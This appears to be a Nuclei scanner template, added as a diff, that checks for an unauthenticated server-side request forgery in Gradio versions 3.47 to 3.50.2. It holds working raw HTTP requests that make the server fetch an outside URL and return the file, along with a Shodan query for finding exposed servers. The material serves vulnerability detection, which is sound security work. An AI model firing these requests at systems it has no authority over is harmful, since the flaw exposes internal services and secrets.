@@ -1,0 +1,58 @@
+id: gradio-ssrf
+
+info:
+  name: Gradio 3.47 - 3.50.2 - Server-Side Request Forgery
+  author: nvn1729
+  severity: high
+  description: |
+    Gradio Full Read SSRF when auth is not enabled, this version should work for versions 3.47 - 3.50.2.
+  reference:
+    - https://github.com/gradio-app/gradio/commit/24a583688046867ca8b8b02959c441818bdb34a2
+    - https://www.horizon3.ai/attack-research/disclosures/exploiting-file-read-vulnerabilities-in-gradio-to-steal-secrets-from-hugging-face-spaces/
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    epss-percentile: 0.36659
+  metadata:
+    verified: true
+    max-request: 2
+    shodan-query: html:"__gradio_mode__"
+  tags: cve,cve2024,unauth,gradio,ssrf
+
+http:
+  - raw:
+      - |
+        POST /component_server HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"component_id": "{{fuzz_component_id}}", "data": "http://oast.me", "fn_name": "download_temp_copy_if_needed", "session_hash": "aaaaaaaaaaa"}
+
+      - |
+        GET /file={{download_path}} HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: regex
+        part: body
+        name: download_path
+        group: 1
+        regex:
+          - "\"?([^\"]+)"
+        internal: true
+
+    payloads:
+      fuzz_component_id: helpers/wordlists/numbers.txt
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body_2
+        words:
+          - "<h1> Interactsh Server </h1>"
+
+      - type: status
+        status:
+          - 200
+# digest: 4b0a0048304602210084254e5be884aa98296a738a4c7318f5fc3144cd7a242e19dfc57c3e7540a125022100db240aae793f3c25c826a49fe256d4109590d1fd40a2ad08de4d75925b3985f3:922c64590222798bb761d5b6d8e72950
